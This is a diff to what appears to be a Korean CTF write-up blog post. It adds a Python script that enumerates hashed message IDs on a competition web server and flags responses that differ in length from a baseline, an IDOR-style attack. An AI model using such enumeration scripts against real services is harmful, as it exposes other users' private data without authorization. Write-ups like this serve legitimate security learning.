@@ -68,7 +68,7 @@ function generateHash(messageId) {
 for (let i = 1; i <= 1000; i++) {
     generateHash(i);
 }
-{% highlight %}
+{% endhighlight %}
 
 2. python을 통해 값 얻어내기
 
@@ -77,6 +77,59 @@ for (let i = 1; i <= 1000; i++) {
 존재하지 않는 값을 기준으로 잡고,
 그 값의 text 길이와 동일하지 않다면 값을 출력하는 로직이다.
 
+{% highlight js %}
+import requests
+import time
+cookies = {
+    'session': '[세션값]',
+}
+import warnings
+warnings.filterwarnings('ignore')
+headers = {
+    'Host': 'secuweb-web.2024-bq.ctfcompetition.com',
+    'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Priority': 'u=0, i',
+    # 'Cookie': 'session=.[세션값]',
+}
+
+a=["67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2",
+"b1b1bd1ed240b1496c81ccf19ceccf2af6fd24fac10ae42023628abbe2687310",
+...
+"006e9d54d7ebe3029abf15866b51294ce3defb2bc2c27762570819f0959b250499"]
+
+OriginResponse = requests.get(
+    f'https://secuweb-web.2024-bq.ctfcompetition.com/message/1666',
+    cookies=cookies,
+    headers=headers,
+    verify=False,
+)
+
+count = 0
+for i in a:
+    count+=1
+    response = requests.get(
+        f'https://secuweb-web.2024-bq.ctfcompetition.com/message/{i}',
+        cookies=cookies,
+        headers=headers,
+        verify=False,
+    )
+    if len(OriginResponse.text) != len(response.text):
+        print(response.text)
+        print(count)
+        print(i)
+
+{% endhighlight %}
 
 하다보면 이렇게 손으로 하는 건 아닌지 걱정도 해주고
 
